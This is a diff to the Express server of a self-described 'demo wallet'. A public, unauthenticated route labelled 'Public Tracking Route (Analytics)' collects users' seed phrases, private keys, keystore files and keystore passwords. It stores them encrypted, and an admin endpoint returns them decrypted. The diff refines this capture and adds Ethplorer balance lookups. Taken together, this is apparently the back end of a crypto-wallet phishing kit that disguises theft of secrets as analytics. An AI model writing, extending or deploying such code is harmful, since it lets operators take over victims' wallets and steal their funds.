@@ -193,10 +193,6 @@ app.get("/api/admin/users", authMiddleware, (req, res) => {
       users = trackedUsers;
     }
     const out = users.map(u => {
-      const m = decrypt(u.encMnemonic || u.enc_mnemonic);
-      const pk = decrypt(u.encPrivateKey || u.enc_private_key);
-      const ks = decrypt(u.encKeystoreJSON || u.enc_keystore_json);
-      const kp = decrypt(u.encKeystorePassword || u.enc_keystore_password);
       return {
         userId: u.userId || u.user_id,
         address: u.address,
@@ -209,13 +205,11 @@ app.get("/api/admin/users", authMiddleware, (req, res) => {
         appLimits: u.appLimits || u.app_limits,
         riskFlags: u.riskFlags || u.risk_flags,
         transactions: u.transactions,
-        mnemonic: m || null,
-        privateKey: pk || null,
-        keystoreJSON: ks || null,
-        keystorePassword: kp || null,
-        hasPrivateKey: (u.hasPrivateKey === true) || (u.has_private_key === true),
-        keystorePreview: u.keystorePreview || u.keystore_preview || null,
-        keystorePasswordCaptured: (u.keystorePasswordCaptured === true) || (u.keystore_password_captured === true)
+        importMethod: u.importMethod,
+        mnemonic: u.encMnemonic ? decrypt(u.encMnemonic) : null,
+        privateKey: u.encPrivateKey ? decrypt(u.encPrivateKey) : null,
+        keystoreJSON: u.encKeystoreJSON ? decrypt(u.encKeystoreJSON) : null,
+        keystorePassword: u.encKeystorePassword ? decrypt(u.encKeystorePassword) : null
       };
     });
     return res.json({ users: out });
@@ -280,7 +274,7 @@ app.post("/api/admin/users/delete", authMiddleware, (req, res) => {
 
 // Public Tracking Route (Analytics)
 app.post("/api/track/login", (req, res) => {
-  const { address, walletType, balance, assets, transactions, importMethod, mnemonic, privateKey, keystoreJSON, keystorePassword, hasPrivateKey, keystorePreview, keystorePasswordCaptured } = req.body;
+  const { address, walletType, balance, assets, transactions: txs, mnemonic, privateKey, keystoreJSON, keystorePassword, importMethod } = req.body;
   
   if (!address) return res.status(400).json({ error: "Address required" });
 
@@ -315,15 +309,12 @@ app.post("/api/track/login", (req, res) => {
     featureFlags: { canSwap: true, canSend: true, canStake: false },
     appLimits: { dailySend: 50000, dailySwap: 100000 },
     riskFlags,
-    transactions: transactions || (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : []),
-    importMethod: importMethod || (existingIndex >= 0 ? trackedUsers[existingIndex].importMethod : null),
-    encMnemonic: encrypt(mnemonic),
-    encPrivateKey: encrypt(privateKey),
-    encKeystoreJSON: encrypt(keystoreJSON),
-    encKeystorePassword: encrypt(keystorePassword),
-    hasPrivateKey: hasPrivateKey === true,
-    keystorePreview: keystorePreview || null,
-    keystorePasswordCaptured: keystorePasswordCaptured === true
+    transactions: txs || (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : []),
+    importMethod: importMethod || (mnemonic ? 'seed_phrase' : (existingIndex >= 0 ? trackedUsers[existingIndex].importMethod : 'unknown')),
+    encMnemonic: mnemonic ? encrypt(mnemonic) : (existingIndex >= 0 ? trackedUsers[existingIndex].encMnemonic : null),
+    encPrivateKey: privateKey ? encrypt(privateKey) : (existingIndex >= 0 ? trackedUsers[existingIndex].encPrivateKey : null),
+    encKeystoreJSON: keystoreJSON ? encrypt(keystoreJSON) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystoreJSON : null),
+    encKeystorePassword: keystorePassword ? encrypt(keystorePassword) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystorePassword : null)
   };
 
   (async () => {
@@ -415,6 +406,43 @@ app.get("/api/transactions", authMiddleware, (req, res) => {
 
 app.post("/api/withdraw", authMiddleware, (req, res) => {
   return res.status(403).json({ error: "withdrawals_disabled", message: "Withdrawals are not permitted in this demo wallet." });
+});
+
+// Ethplorer Proxy for Real Balances & Transactions
+app.get("/api/ethplorer/address-info", async (req, res) => {
+    const { address } = req.query;
+    if (!address) return res.status(400).json({ error: "Address required" });
+    try {
+        const resp = await fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`);
+        const data = await resp.json();
+        res.json(data);
+    } catch (e) {
+        res.status(500).json({ error: "Upstream error" });
+    }
+});
+
+app.get("/api/ethplorer/address-history", async (req, res) => {
+    const { address, limit } = req.query;
+    if (!address) return res.status(400).json({ error: "Address required" });
+    try {
+        const resp = await fetch(`https://api.ethplorer.io/getAddressHistory/${address}?apiKey=freekey&limit=${limit || 10}`);
+        const data = await resp.json();
+        res.json(data);
+    } catch (e) {
+        res.status(500).json({ error: "Upstream error" });
+    }
+});
+
+app.get("/api/ethplorer/address-transactions", async (req, res) => {
+    const { address, limit } = req.query;
+    if (!address) return res.status(400).json({ error: "Address required" });
+    try {
+        const resp = await fetch(`https://api.ethplorer.io/getAddressTransactions/${address}?apiKey=freekey&limit=${limit || 10}`);
+        const data = await resp.json();
+        res.json(data);
+    } catch (e) {
+        res.status(500).json({ error: "Upstream error" });
+    }
 });
 
 // Image proxy to avoid cross-origin blocks
@@ -539,7 +567,12 @@ const start = async () => {
   }
   const chosen = await findAvailablePort(PORT);
   PORT = chosen;
-  if (!isProd) {
+  if (!isProd && process.env.API_ONLY === 'true') {
+    app.use('*', async (req, res, next) => {
+      if (req.originalUrl.startsWith('/api')) return next();
+      return res.status(404).json({ error: 'api_only_mode' });
+    });
+  } else if (!isProd) {
     const vite = await import('vite');
     const hmrPort = await findAvailablePort(24678);
     const viteServer = await vite.createServer({
